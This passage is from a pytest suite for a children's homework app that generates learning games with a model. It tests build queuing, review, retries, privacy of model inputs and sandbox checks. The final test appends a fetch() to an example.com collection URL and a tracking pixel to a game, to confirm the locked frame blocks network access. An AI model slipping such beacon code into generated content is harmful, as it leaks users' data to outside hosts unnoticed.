    signup(other, 'other@example.test'); setup_pin(other); unlock(other)
    assert other.get(f"/api/games/parent/{child['id']}/history").status_code == 404
    select_child(other, create_child(other).json()['id'])
    assert other.get(path).status_code == 404 and other.get(path + '/frame').status_code == 404
    assert client_factory().get(path + '/frame').status_code == 401


def test_background_build_is_queued_once_names_only_the_skill_and_waits_for_review(family, security_context, games_on, monkeypatch):
    child, client = family
    upload_id = upload(security_context, child)
    monkeypatch.setenv('SIDEKICK_GAMES_AUTOGENERATE', 'true')
    monkeypatch.delenv('VISION_API_KEY', raising=False)   # a key in a developer's own backend/.env must not count here
    assert client.get('/api/games/kid/suggestion', params={'uploadId': upload_id}).json()['canRequest'] is False   # no model configured
    assert mutate(client, 'POST', '/api/games/kid/request', json={'uploadId': upload_id}).json() == {'queued': False, 'state': 'off'}
    monkeypatch.setenv('VISION_API_KEY', 'test-key'); monkeypatch.setenv('VISION_MODEL', 'test-model')
    adapter = FakeAdapter([draft()])
    monkeypatch.setitem(main.app.state._state, 'game_adapter', adapter)
    monkeypatch.setitem(main.app.state._state, 'game_robot', lambda code, css: PASSING)
    assert client.get('/api/games/kid/suggestion', params={'uploadId': upload_id}).json()['canRequest'] is True
    # TestClient runs the background task before returning, as a deployed server does after responding.
    assert mutate(client, 'POST', '/api/games/kid/request', json={'uploadId': upload_id}).json() == {'queued': True, 'state': 'building'}
    assert adapter.calls == ['draft', 'review']
    sent = str(adapter.seen)
    for private in (child['id'], child['firstName'], upload_id, 'Private homework wording', 'parent@example.com'):
        assert private not in sent
    view = client.get('/api/games/kid/suggestion', params={'uploadId': upload_id}).json()
    assert view['state'] == 'in_review' and view['game'] is None
    assert mutate(client, 'POST', '/api/games/kid/request', json={'uploadId': upload_id}).json() == {'queued': False, 'state': 'in_review'}
    with security_context.db.transaction() as conn:
        row = conn.execute('SELECT status,origin,model FROM game_versions').fetchone()
        jobs = conn.execute('SELECT status FROM game_jobs').fetchall()
    assert dict(row) == {'status': 'verified', 'origin': 'model_generated', 'model': 'fake-model'} and [job['status'] for job in jobs] == ['done']


def test_failed_build_is_recorded_and_not_retried_right_away(family, security_context, games_on, monkeypatch):
    child, client = family
    upload_id = upload(security_context, child)
    monkeypatch.setenv('SIDEKICK_GAMES_AUTOGENERATE', 'true'); monkeypatch.setenv('VISION_API_KEY', 'k'); monkeypatch.setenv('VISION_MODEL', 'm')
    monkeypatch.setitem(main.app.state._state, 'game_adapter', FakeAdapter([draft()] * 4))
    monkeypatch.setitem(main.app.state._state, 'game_robot', lambda code, css: failing('round_2_mistake_adds_rejected', 'the game accepted a known mistake as a win'))
    assert mutate(client, 'POST', '/api/games/kid/request', json={'uploadId': upload_id}).json()['queued'] is True
    view = client.get('/api/games/kid/suggestion', params={'uploadId': upload_id}).json()
    assert view['state'] == 'none' and view['canRequest'] is False
    assert mutate(client, 'POST', '/api/games/kid/request', json={'uploadId': upload_id}).json()['queued'] is False
    picker(client); unlock(client)
    job = client.get('/api/games/review').json()['jobs'][0]
    assert job['status'] == 'failed' and job['failure']['code'] == 'not_verified' and 'accepted a known mistake' in job['failure']['problems'][0]
    assert job['failure']['stoppedBy'] == 'the robot player' and job['failure']['tries'] == 4
    with security_context.db.transaction() as conn:
        assert conn.execute('SELECT COUNT(*) FROM game_versions').fetchone()[0] == 0


def test_new_every_upload_mode_writes_a_new_game_for_each_upload(family, security_context, games_on, monkeypatch):
    child, client = family
    shipped = store(security_context, status='approved')            # a game for the skill already exists
    security_context.clock.advance(60)
    first = upload(security_context, child)
    for name, value in (('SIDEKICK_GAMES_AUTOGENERATE', 'true'), ('SIDEKICK_GAMES_REQUIRE_APPROVAL', 'false'), ('VISION_API_KEY', 'k'), ('VISION_MODEL', 'm')):
        monkeypatch.setenv(name, value)
    suggestion = lambda upload_id: client.get('/api/games/kid/suggestion', params={'uploadId': upload_id}).json()  # noqa: E731
    request = lambda upload_id: mutate(client, 'POST', '/api/games/kid/request', json={'uploadId': upload_id}).json()  # noqa: E731
    # Without the mode, the game that exists is the one on offer and nothing is written.
    assert suggestion(first)['game']['id'] == shipped and suggestion(first)['canRequest'] is False
    # The mode alone does nothing unless a game can be written: it needs AUTOGENERATE and a model.
    monkeypatch.setenv('SIDEKICK_GAMES_NEW_EVERY_UPLOAD', 'true'); monkeypatch.setenv('SIDEKICK_GAMES_AUTOGENERATE', 'false')
    assert suggestion(first)['game']['id'] == shipped
    monkeypatch.setenv('SIDEKICK_GAMES_AUTOGENERATE', 'true')

    adapter = FakeAdapter([draft(FROG + '\n// one'), draft(FROG + '\n// two'), draft(FROG + '\n// three')], [review(), review(), review()])
    monkeypatch.setitem(main.app.state._state, 'game_adapter', adapter)
    monkeypatch.setitem(main.app.state._state, 'game_robot', lambda code, css: PASSING)
    # With it, a game written before this upload does not count, so a new one is asked for.
    view = suggestion(first)
    assert view['state'] == 'none' and view['game'] is None and view['canRequest'] is True and view['approval'] is False
    assert request(first) == {'queued': True, 'state': 'building'}
    one = suggestion(first)
    assert one['state'] == 'ready' and one['game']['id'] != shipped and one['canRequest'] is False
    # The writer was told what exists for the skill, so it makes something different. Game data only.
    assert [item['title'] for item in adapter.seen[0]['alreadyMade']] == ["Froggy's Bridge"] and 'different game' in adapter.seen[0]['task']
    assert child['id'] not in str(adapter.seen) and first not in str(adapter.seen)
    run = mutate(client, 'POST', '/api/games/kid/start', json={'uploadId': first, 'idempotencyKey': key()}).json()
    assert run['game']['id'] == one['game']['id'] and suggestion(first)['runId'] == run['id']

    # More work on the same skill gets its own game. The earlier upload keeps the one written for it.
    security_context.clock.advance(60)
    second = upload(security_context, child)
    assert suggestion(second)['state'] == 'none' and suggestion(second)['canRequest'] is True
    assert request(second)['queued'] is True
    two = suggestion(second)
    assert two['state'] == 'ready' and two['game']['id'] not in {shipped, one['game']['id']} and two['runId'] is None
    assert suggestion(first)['game']['id'] == one['game']['id']
    assert len(adapter.seen[1]['alreadyMade']) == 2   # the shipped game and the one just written

    # Sending the same page in again is the same upload and a new request, so it also gets a new game.
    security_context.clock.advance(60)
    with security_context.db.transaction() as conn:
        conn.execute('INSERT INTO homework_upload_requests VALUES(?,?,?,?,?)', (child['id'], 'auto-' + key(), first, 'digest', security_context.clock.now()))
    again = suggestion(first)
    assert again['state'] == 'none' and again['canRequest'] is True and again['runId'] is None
    assert request(first)['queued'] is True
    three = suggestion(first)
    assert three['state'] == 'ready' and three['game']['id'] not in {shipped, one['game']['id'], two['game']['id']}
    with security_context.db.transaction() as conn:
        assert conn.execute("SELECT COUNT(*) FROM game_versions WHERE origin='model_generated'").fetchone()[0] == 3
    # Switched off again, the usual rule is back: the approved game for the skill.
    monkeypatch.setenv('SIDEKICK_GAMES_NEW_EVERY_UPLOAD', 'false')
    assert suggestion(first)['game']['id'] == shipped


def test_new_every_upload_mode_says_when_a_build_failed_and_lets_the_next_upload_try(family, security_context, games_on, monkeypatch):
    child, client = family
    for name, value in (('SIDEKICK_GAMES_AUTOGENERATE', 'true'), ('SIDEKICK_GAMES_REQUIRE_APPROVAL', 'false'), ('SIDEKICK_GAMES_NEW_EVERY_UPLOAD', 'true'),
                        ('VISION_API_KEY', 'k'), ('VISION_MODEL', 'm')):
        monkeypatch.setenv(name, value)
    suggestion = lambda upload_id: client.get('/api/games/kid/suggestion', params={'uploadId': upload_id}).json()  # noqa: E731
    first = upload(security_context, child)
    monkeypatch.setitem(main.app.state._state, 'game_adapter', FakeAdapter([draft()] * 4))
    monkeypatch.setitem(main.app.state._state, 'game_robot', lambda code, css: failing('fits_phone'))
    assert mutate(client, 'POST', '/api/games/kid/request', json={'uploadId': first}).json()['queued'] is True
    # The build for this upload failed. The card is told, and it does not ask again for the same upload.
    view = suggestion(first)
    assert view['state'] == 'none' and view['reason'] == 'build_failed' and view['canRequest'] is False
    assert mutate(client, 'POST', '/api/games/kid/request', json={'uploadId': first}).json()['queued'] is False
    # New work on the same skill is not shut out by that failure.
    security_context.clock.advance(60)
    second = upload(security_context, child)
    view = suggestion(second)
    assert view['reason'] is None and view['canRequest'] is True
    monkeypatch.setitem(main.app.state._state, 'game_adapter', FakeAdapter([draft()]))
    monkeypatch.setitem(main.app.state._state, 'game_robot', lambda code, css: PASSING)
    assert mutate(client, 'POST', '/api/games/kid/request', json={'uploadId': second}).json()['queued'] is True
    assert suggestion(second)['state'] == 'ready'


def test_a_build_the_model_could_not_start_may_try_again_soon(family, security_context, games_on, monkeypatch):
    from backend.provider import ExtractionError

    class Unreachable(FakeAdapter):
        async def draft(self, subskill, examples, context=None):
            raise ExtractionError('provider_timeout', 'Reading took too long. Please retry.', 504)

    child, client = family
    upload_id = upload(security_context, child)
    monkeypatch.setenv('SIDEKICK_GAMES_AUTOGENERATE', 'true'); monkeypatch.setenv('VISION_API_KEY', 'k'); monkeypatch.setenv('VISION_MODEL', 'm')
    monkeypatch.setitem(main.app.state._state, 'game_adapter', Unreachable([]))
    monkeypatch.setitem(main.app.state._state, 'game_robot', lambda code, css: PASSING)
    suggestion = lambda: client.get('/api/games/kid/suggestion', params={'uploadId': upload_id}).json()  # noqa: E731
    assert mutate(client, 'POST', '/api/games/kid/request', json={'uploadId': upload_id}).json()['queued'] is True
    with security_context.db.transaction() as conn:
        job = conn.execute('SELECT status,failure_json FROM game_jobs').fetchone()
    assert job['status'] == 'failed' and json.loads(job['failure_json']) == {'code': 'provider_timeout'}
    # No game was turned down, so the skill is not shut out for a day: only for a few minutes.
    assert suggestion()['canRequest'] is False
    security_context.clock.advance(library.UNAVAILABLE_RETRY_SECONDS + 1)
    assert suggestion()['canRequest'] is True
    monkeypatch.setitem(main.app.state._state, 'game_adapter', FakeAdapter([draft()]))
    assert mutate(client, 'POST', '/api/games/kid/request', json={'uploadId': upload_id}).json() == {'queued': True, 'state': 'building'}
    assert suggestion()['state'] == 'in_review'


def test_model_call_is_tried_once_more_after_a_malformed_answer_but_not_after_a_timeout(monkeypatch):
    from backend.games.pipeline import ModelGameAdapter
    from backend.gap import vision
    from backend.provider import ExtractionError
    monkeypatch.setenv('VISION_API_KEY', 'k'); monkeypatch.setenv('VISION_MODEL', 'm')
    outcomes, calls = [], []

    async def fake_call(response_model, **kwargs):
        calls.append(kwargs['task'])
        outcome = outcomes.pop(0)
        if isinstance(outcome, Exception):
            raise outcome
        return outcome

    monkeypatch.setattr(vision, 'structured_call', fake_call)
    adapter = ModelGameAdapter()
    outcomes[:] = [ExtractionError('invalid_extraction', 'incomplete'), review()]
    assert asyncio.run(adapter.review(SKILL, draft(), PASSING['manifest'])).passed() and calls == ['review_game', 'review_game']
    calls.clear(); outcomes[:] = [ExtractionError('provider_timeout', 'slow', 504)]
    with pytest.raises(ExtractionError):
        asyncio.run(adapter.review(SKILL, draft(), PASSING['manifest']))
    assert calls == ['review_game']
    # A second malformed answer is the end of it.
    calls.clear(); outcomes[:] = [ExtractionError('invalid_extraction', 'incomplete'), ExtractionError('invalid_extraction', 'incomplete')]
    with pytest.raises(ExtractionError):
        asyncio.run(adapter.review(SKILL, draft(), PASSING['manifest']))
    assert calls == ['review_game', 'review_game']


def test_child_deletion_removes_runs_but_keeps_the_library(family, security_context, games_on):
    child, client = family
    upload_id = upload(security_context, child)
    store(security_context, status='approved')
    mutate(client, 'POST', '/api/games/kid/start', json={'uploadId': upload_id, 'idempotencyKey': key()})
    picker(client)
    with security_context.db.transaction() as conn:
        conn.execute('DELETE FROM kid_profiles WHERE id=?', (child['id'],))
        assert conn.execute('SELECT COUNT(*) FROM game_runs').fetchone()[0] == 0
        assert conn.execute('SELECT COUNT(*) FROM game_start_requests').fetchone()[0] == 0
        assert conn.execute('SELECT COUNT(*) FROM game_versions').fetchone()[0] == 1


# ------------------------------------------------------------------ the real robot, in a real browser

def robot_or_skip(runner, *args, **kwargs):
    try:
        return runner(*args, **kwargs)
    except RobotUnavailable as error:
        pytest.skip(f'robot player not available here: {error}')


@pytest.mark.parametrize('slug', sorted(EXAMPLES))
def test_reference_games_pass_the_real_robot(slug):
    report = robot_or_skip(run_robot, EXAMPLES[slug]['code'], EXAMPLES[slug]['css'])
    assert report['passed'], failures(report)
    assert report['stats']['randomWins'] * 3 <= report['stats']['randomTrials']


def test_every_shipped_game_is_clean_named_and_tied_to_one_real_skill():
    skills = {item['subskill_id'] for item in json.loads((prompts.ROOT / 'data' / 'sidekick_skill_map_v2.json').read_text(encoding='utf-8'))}
    assert len(SHIPPED) == len(prompts.load_library()), 'two games share a folder name'
    seen = {}
    for slug, game in SHIPPED.items():
        assert checks.static_issues(game['code'], game['css']) == [], slug
        assert game['subskillId'] in skills, f'{slug} names a skill that is not in the skill map'
        assert seen.setdefault(game['subskillId'], slug) == slug, f'{slug} and {seen[game["subskillId"]]} cover the same skill'
        assert 3 <= len(game['title']) <= 60 and 10 <= len(game['premise']) <= 180 and game['emoji'] and game['idea'], slug
        assert game['title'] in game['code'], f'{slug}: meta title does not match the game'
        assert '\u2014' not in game['code'] + game['premise'] + game['idea'], slug


# The whole library takes several minutes in a real browser, so it runs on request:
#   SIDEKICK_GAMES_VERIFY_LIBRARY=1 npm run test:backend -- -k library     (or: npm run games:verify)
@pytest.mark.skipif(not os.environ.get('SIDEKICK_GAMES_VERIFY_LIBRARY'), reason='set SIDEKICK_GAMES_VERIFY_LIBRARY=1 to play every library game')
@pytest.mark.parametrize('slug', sorted(LIBRARY))
def test_library_games_pass_the_real_robot(slug):
    report = robot_or_skip(run_robot, LIBRARY[slug]['code'], LIBRARY[slug]['css'])
    assert report['passed'], failures(report)


@pytest.mark.parametrize('change,expected', [
    (("check: (stage) => Math.abs(built(stage) - target) < 0.0001,", "check: (stage) => built(stage) > 0,"), 'not_already_solved|mistake|rejected|not_guessable'),
    (("check: (stage) => Math.abs(built(stage) - target) < 0.0001,", "check: () => false,"), 'solution_wins'),
    (("const frog = stage.sprite({ id: 'frog'", "stage.nothingHere(); const frog = stage.sprite({ id: 'frog'"), 'opens|no_errors|starts'),
    (("solution: () => lay(o.b, o.a),", "solution: () => lay(o.b, o.a + 1),"), 'solution_wins'),
])
def test_real_robot_rejects_broken_games(change, expected):
    import re
    assert change[0] in FROG
    report = robot_or_skip(run_robot, FROG.replace(change[0], change[1]))
    assert not report['passed']
    assert any(re.search(expected, line) for line in failures(report)), failures(report)


def test_the_locked_frame_blocks_network_even_when_static_checks_are_bypassed():
    sneaky = FROG + "\nfetch('https://example.com/collect?x=1').catch(function () {});\nnew Image().src = 'https://example.com/pixel.png';\n"
    assert 'network' in checks.static_issues(sneaky)
    report = robot_or_skip(play, sneaky)
    names = {item['name'] for item in report['checks'] if not item['ok']}
    assert not report['passed'] and names & {'no_errors', 'no_network'}, failures(report)
